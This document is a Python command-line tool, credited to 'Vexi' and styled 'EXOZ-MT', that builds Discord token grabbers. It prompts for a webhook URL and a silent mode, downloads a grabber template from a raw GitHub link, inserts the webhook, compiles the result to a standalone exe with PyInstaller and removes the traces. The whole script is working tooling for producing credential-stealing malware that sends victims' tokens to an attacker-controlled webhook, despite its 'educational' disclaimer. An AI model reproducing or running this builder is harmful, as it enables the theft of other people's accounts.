# Disclaimer: This is only for entertainment and educational purposes.  
# I'm not responsible for what you do with it or any consequences.  
# Made by Vexi :3

import os
import time
import shutil
import requests

try:
    import colorama
    colorama.init()
except Exception:
    if os.name == "nt":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetStdHandle(-11)  
            mode = ctypes.c_uint32()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                kernel32.SetConsoleMode(handle, mode.value | 0x0004)
        except Exception:
            pass

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
RESET = "\033[0m"

def gradient(text):
    lines = text.splitlines()
    if not lines:
        return ""

    start_color = (120, 0, 0)
    end_color = (255, 60, 60)
    num_lines = len(lines)
    max_length = max((len(line) for line in lines), default=1)

    out_lines = []
    for li, line in enumerate(lines):
        line_ratio = li / (num_lines - 1) if num_lines > 1 else 0
        chars = []
        for ci, ch in enumerate(line):
            char_ratio = ci / (max_length - 1) if max_length > 1 else 0
            ratio = (line_ratio + char_ratio) / 2.0
            r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
            chars.append(f"\033[38;2;{r};{g};{b}m{ch}")
        out_lines.append("".join(chars) + RESET)
    return "\n".join(out_lines)

title = r"""
EXOZ-MT - Thanks to Vexi, this product is brought to you for free! 🎀
█████████████████████████████████████████████████████████████████████████████████

████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝

████████████████████████████████████████████████████████████████████
"""

print(gradient(title))

menu = """
[ 1 ] Build Token Grabber file
[ 0 ] Exit
"""

print(gradient(menu))

choice = int(input(f"{BLUE}Select an option → {RESET}"))

if choice == 1:
    file_name = input(f"\n{CYAN}What should the file be called. → {RESET}")
    webhook = input(f"{CYAN}Enter your webhook url → {RESET}")
    silent_mode = input(f"{CYAN}Should the token grabber be silent mode? (no console output) (true/false) → {RESET}").strip().title()

    template = r"https://raw.githubusercontent.com/vn4thyt/vnsyt/refs/heads/main/Stuff/Discord%20Token%20Grabber/ignore/template.py"
    source = requests.get(template).text

    if not (file_name.lower().endswith(".py") or file_name.lower().endswith(".pyw")):
        if silent_mode == "True":
            file_name += ".pyw"
        else:
            file_name += ".py"

    if os.path.exists(file_name):
        response = input(f"{YELLOW}File '{file_name}' already exists. Overwrite? (y/n) → {RESET}").strip().lower()
        if response != 'y':
            exit()

    try:
        print(f"""{GREEN}
File name: {file_name}
Webhook: {webhook}
Silent Mode: {silent_mode}""")
        
        confirm = input(f"\n{GREEN}Would you like to confirm these? (y/n) → {RESET}").strip().lower()

        if confirm == "y":
            directory = os.path.dirname(os.path.abspath(__file__))
        
            print(f"{GREEN}Creating builds folder..")
            folder_path = os.path.join(directory, 'Builds')
            os.makedirs(folder_path, exist_ok=True)
            time.sleep(2)
            print(f"{GREEN}Builds folder created!")

            time.sleep(1)
            print(f"{GREEN}Creating token grabber file..{RESET}")
            file_path = os.path.join(folder_path, file_name)
            with open(file_path, 'w') as f:
                print(f"{GREEN}Token grabber file created!{RESET}")
                time.sleep(1)
                print(f"{GREEN}Writing file contents..{RESET}")
                modified_source = source
                modified_source = modified_source.replace("{placeholder_webhook}", webhook)
                f.write(modified_source)
                print(f"{GREEN}File contents have been written!{RESET}")

            time.sleep(1)
            print(f"{GREEN}Installing python to exe requirements..{RESET}")
            os.system("pip install pyinstaller")
            print(f"{GREEN}Python to exe requirements installed!{RESET}")

            time.sleep(1)
            print(f"{GREEN}Converting python file to exe..{RESET}")
            original_dir = os.getcwd()
            os.chdir(folder_path)
            os.system(f'pyinstaller "{file_name}" --onefile --clean')
            time.sleep(2)
            print(f"{GREEN}Converted python file to exe!{RESET}")

            time.sleep(4)
            print(f"{GREEN}Doing some finishing touches..{RESET}")
            build_path = os.path.join(folder_path, 'build')
            dist_path = os.path.join(folder_path, 'dist')
            
            if file_name.endswith('.py'):
                exe_file_name = file_name.replace('.py', '.exe')
                spec_file_name = file_name.replace('.py', '.spec')
            elif file_name.endswith('.pyw'):
                exe_file_name = file_name.replace('.pyw', '.exe')
                spec_file_name = file_name.replace('.pyw', '.spec')
            else:
                exe_file_name = file_name + '.exe'
                spec_file_name = file_name + '.spec'
            
            exe_path = os.path.join(dist_path, exe_file_name)
            spec_file = os.path.join(folder_path, spec_file_name)

            if os.path.exists(exe_path):
                final_exe_path = os.path.join(folder_path, exe_file_name)
                shutil.move(exe_path, final_exe_path)
                print(f"{GREEN}Moved exe file to Builds folder!{RESET}")
            
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"{GREEN}Deleted original Python file!{RESET}")
            
            if os.path.exists(spec_file):
                os.remove(spec_file)
                print(f"{GREEN}Deleted .spec file!{RESET}")
            
            if os.path.exists(build_path):
                try:
                    shutil.rmtree(build_path)
                    print(f"{GREEN}Deleted build folder{RESET}")
                except Exception as e:  
                    print(f"{RED}Failed to delete build folder: {e}{RESET}")
                    print(f"{YELLOW}You may need to delete this folder manually.")
            
            if os.path.exists(dist_path) and os.path.isdir(dist_path):
                try:
                    shutil.rmtree(dist_path)
                    print(f"{GREEN}Deleted dist folder{RESET}")
                except Exception as e:
                    print(f"{RED}Failed to delete dist folder: {e}{RESET}")
                    print(f"{YELLOW}You may need to delete this folder manually.")
            
            os.chdir(original_dir)
            print(f"{GREEN}Finishing touches complete!{RESET}")
            
            print(f"{CYAN}\n✅ SUCCESS! Token grabber has been made. \nToken grabber file located at: {os.path.join(folder_path, exe_file_name)}")
            input(f"{CYAN}Press enter to exit. → {RESET}")
        else:
            exit()
    except Exception as e:
        print(f"{RED}Error creating file: {e}")

elif choice == 0:
    print("Exitting.")
